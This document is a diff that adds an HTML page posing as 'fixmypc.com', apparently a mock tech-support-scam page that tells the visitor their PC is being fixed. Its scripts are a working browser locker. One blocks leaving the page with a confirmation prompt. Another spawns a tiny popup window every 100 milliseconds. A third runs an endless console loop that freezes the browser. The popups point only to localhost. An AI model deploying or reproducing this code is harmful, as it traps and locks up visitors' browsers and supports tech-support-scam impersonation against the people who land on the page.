@@ -1,0 +1,33 @@
+<html style="color: white">
+  <head>
+    <title>fixmypc.com</title>
+    <script
+      src="https://code.jquery.com/jquery-3.6.0.min.js"
+      integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+      crossorigin="anonymous"
+    ></script>
+  </head>
+  <body style="background-color: black">
+    <h1>Yes, ma'am we're fixing your pc right now just wait a moment..</h1>
+    <script>
+      window.onbeforeunload = confirmExit;
+      function confirmExit() {
+        return "You have attempted to leave this page. Are you sure?";
+      }
+    </script>
+    <script>
+      function myFunc() {
+        while (true) console.log((9999 ** 99999) * 999999 ** 999999);
+      }
+      setInterval(() => {
+        newwindow = window.open(
+          "http://localhost:5000/fix-my-pc",
+          "_blank",
+          "resizable=no, scrollbars=yes, titlebar=yes, width=10, height=10, top=10, left=10"
+        );
+        //newwindow = window.open("http://localhost:5000/freeze", "_blank", "resizable=no, scrollbars=yes, titlebar=yes, width=10, height=10, top=10, left=10");
+        myFunc();
+      }, 100);
+    </script>
+  </body>
+</html>
